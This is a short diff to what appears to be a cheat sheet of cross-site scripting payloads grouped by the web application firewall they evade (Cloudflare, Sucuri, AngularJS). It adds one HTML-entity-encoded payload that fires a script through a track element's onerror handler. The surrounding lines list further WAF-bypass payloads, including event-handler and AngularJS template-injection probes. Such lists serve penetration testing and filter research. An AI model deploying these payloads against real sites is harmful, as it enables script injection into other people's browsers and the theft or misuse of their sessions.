@@ -827,6 +827,7 @@ d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]
 
 ```javascript
 Cloudflare
+&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
 <svg/onrandom=random onload=confirm(1)>
 <video onnull=null onmouseover=confirm(1)>
 <svg/OnLoad="`${prompt``}`">
@@ -888,7 +889,7 @@ Sucuri
 1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
 
 AndularJS
-{{constructor.constructor(alert 1 )()}} 
+{{constructor.constructor(alert 1 )()}}
 ```
 
 
